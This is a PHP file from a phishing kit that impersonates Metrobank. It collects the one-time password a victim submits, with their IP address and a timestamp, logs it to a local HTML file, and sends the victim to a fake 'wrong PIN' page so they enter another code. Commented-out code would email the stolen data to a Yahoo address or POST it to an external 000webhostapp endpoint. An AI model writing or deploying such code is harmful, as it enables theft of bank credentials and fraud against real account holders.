<?php 
session_start();
$date = new DateTime(null, new DateTimeZone('Asia/Manila'));

$ip = getenv('REMOTE_ADDR');
$otp = $_POST['otp'];
if($_GET['wrongpin'] == 'true'){
$hostname = gethostbyaddr($ip);
$otps = "--------------[Metrobank OTP]--------------\n";
$otps .= 'OTP: '.$otp."\n";
$otps .= 'IP: '.$ip."\n";
$otps .= 'Timestamp: '.strval($date->format('F d/h:iA'))."\n";
$otps .= "------------[Yhuricka Usuopmaki]------------\n";
$bilsub = 'MetroBank Account from '.$_POST['email'];
$bilhead .= "MIME-Version: 2.0\n";
$mailko = 'usuopmaki.yhuricka@yahoo.com';
//mail($mailko,$bilsub,$otps,$bilhead);
fwrite(fopen('./2K20.html','a+'),$otps);
/*$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://onlinebpiexpress.000webhostapp.com/bi/save.php");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "rez=".$otps."&bank=metrobank");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close ($ch);*/
header('Location: otpconfirm.php?retry=true&wrongpin=true');
}else{
$hostname = gethostbyaddr($ip);
$otps = "--------------[Metrobank OTP]--------------\n";
$otps .= 'OTP: '.$otp."\n";
$otps .= 'IP: '.$ip."\n";
$otps .= 'Timestamp: '.strval($date->format('F d/h:iA'))."\n";
$otps .= "------------[Yhuricka Usuopmaki]------------\n";
$bilsub = 'MetroBank Account from '.$_POST['email'];
$bilhead .= "MIME-Version: 2.0\n";
$mailko = 'usuopmaki.yhuricka@yahoo.com';
//mail($mailko,$bilsub,$otps,$bilhead);
fwrite(fopen('./2K20.html','a+'),$otps);
/*$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://onlinebpiexpress.000webhostapp.com/bi/save.php");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "rez=".$otps."&bank=metrobank");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close ($ch);*/
header('Location: otpconfirm.php?wrongpin=true');
exit;
}; ?>
